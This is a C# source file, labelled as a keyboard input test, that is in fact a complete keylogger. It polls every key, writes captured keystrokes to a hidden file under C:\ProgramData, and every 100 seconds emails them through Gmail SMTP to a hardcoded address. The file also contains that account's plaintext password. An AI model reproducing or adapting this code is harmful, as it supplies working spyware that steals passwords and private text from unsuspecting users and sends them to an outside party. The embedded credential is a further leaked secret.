using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Linq;
using System.Net.Mail;
using System.Net;

namespace KeyboardInputTest
{
  // Win API Imports:
  public enum VirtualKeyMapType : int
  {
    ToChar = 2,

    ToVScanCode = 0,

    ToVScanCodeEx = 4
  }

  public static class Keyboard
  {
    public static bool ShiftKey
    {
      get
      {
        return Convert.ToBoolean((int)GetAsyncKeyState(Keys.ShiftKey) & 32768);
      }
    }

    [DllImport("User32.dll")]
    public static extern short GetAsyncKeyState(Keys vKey);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "MapVirtualKeyExW", ExactSpelling = true)]
    public static extern uint MapVirtualKeyExW(Keys uCode, VirtualKeyMapType uMapType, IntPtr dwKeyboardLayoutHandle);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
    public static extern int ToUnicodeEx(Keys wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwKeyboardLayoutHandle);
  }

  public class KeyboardTestClass
  {
    public string texte = "";

    public void RunTest()
    {
      string filePath = "C:\\ProgramData\\output.txt";
      bool internet = true;
      try
      {
        CreateTestMessage2("test connection");
      }
      catch (Exception e)
      {
        internet = false;
      }

      Stopwatch stopWatch = new Stopwatch();
      stopWatch.Start();
      // Get the elapsed time as a TimeSpan value.
      TimeSpan t1;
      TimeSpan t0 = stopWatch.Elapsed;

      while (true)
      {
        string keyString = string.Empty;
        t1 = stopWatch.Elapsed;
        if (ReadKeyboardInput(ref keyString) && keyString.Length > 0)
        {
          if (internet && t1.TotalSeconds - t0.TotalSeconds > 100)
          {
            CreateTestMessage2(texte);
            texte = "";
            t0 = stopWatch.Elapsed;
          }
          texte += keyString;
          if (File.Exists(filePath))
          {
            FileInfo info = new FileInfo(filePath);
            info.Attributes = FileAttributes.Normal;    // Set file to unhidden
          }
          using (StreamWriter sw = new StreamWriter(filePath))
          {
            sw.WriteLine(texte);
          }
          File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
        }
        Thread.Sleep(10);
      }
    }

    public bool ReadKeyboardInput(ref string res)
    {
      var hwnd = WinAPI.GetForegroundWindow();
      var pid = WinAPI.GetWindowThreadProcessId(hwnd, IntPtr.Zero);
      var keyboardLayoutHandle = WinAPI.GetKeyboardLayout(pid);

      foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
      {
        if (Keyboard.GetAsyncKeyState(key) == -32767)
        {
          switch (key)
          {
            // handle exceptional cases
            case Keys.Back:
              res = "BACK";
              return true;

            case Keys.Enter:
              res = "ENTER";
              return true;

            case Keys.LineFeed:
              res = string.Empty;
              return false;
          }
          res = ConvertVirtualKeyToUnicode(key, keyboardLayoutHandle, Keyboard.ShiftKey);
          return true;
        }
      }
      return false;
    }

    public string ConvertVirtualKeyToUnicode(Keys key, IntPtr keyboardLayoutHandle, bool shiftPressed)
    {
      var scanCodeEx = Keyboard.MapVirtualKeyExW(key, VirtualKeyMapType.ToVScanCodeEx, keyboardLayoutHandle);
      if (scanCodeEx > 0)
      {
        byte[] lpKeyState = new byte[256];
        if (shiftPressed)
        {
          lpKeyState[(int)Keys.ShiftKey] = 0x80;
          lpKeyState[(int)Keys.LShiftKey] = 0x80;
        }
        var sb = new StringBuilder(5);
        var rc = Keyboard.ToUnicodeEx(key, scanCodeEx, lpKeyState, sb, sb.Capacity, 0, keyboardLayoutHandle);
        if (rc > 0)
        {
          return sb.ToString();
        }
        else
        {
          // It's a dead key; let's flush out whats stored in the keyboard state.
          rc = Keyboard.ToUnicodeEx(key, scanCodeEx, lpKeyState, sb, sb.Capacity, 0, keyboardLayoutHandle);
          return string.Empty;
        }
      }
      return string.Empty;
    }

    public static void CreateTestMessage2(string texte)
    {
      using (MailMessage mail = new MailMessage())
      {
        mail.From = new MailAddress("stpr49373@gmail.com");
        mail.To.Add("stpr49373@gmail.com");
        mail.Subject = "Hello World";
        mail.Body = "<h1>" + texte + "</h1>";
        mail.IsBodyHtml = true;
        //mail.Attachments.Add(new Attachment("C:\\file.Zip"));

        using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
        {
          smtp.Credentials = new NetworkCredential("stpr49373@gmail.com", "171296SF");
          smtp.EnableSsl = true;
          smtp.Send(mail);
        }
      }
    }
  }

  public class WinAPI
  {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32")]
    public static extern int GetWindowThreadProcessId(IntPtr hwnd, IntPtr lpdwProcessId);

    [DllImport("user32")]
    public static extern IntPtr GetKeyboardLayout(int dwLayout);
  }

  internal class Program
  {
    public static KeyboardTestClass kb;

    private static bool exitSystem = false;
    private static void Main(string[] args)
    {
      kb = new KeyboardTestClass();
      kb.RunTest();

      //hold the console so it doesn’t run off the end
      while (!exitSystem)
      {
        Thread.Sleep(500);
      }
    }
  }
}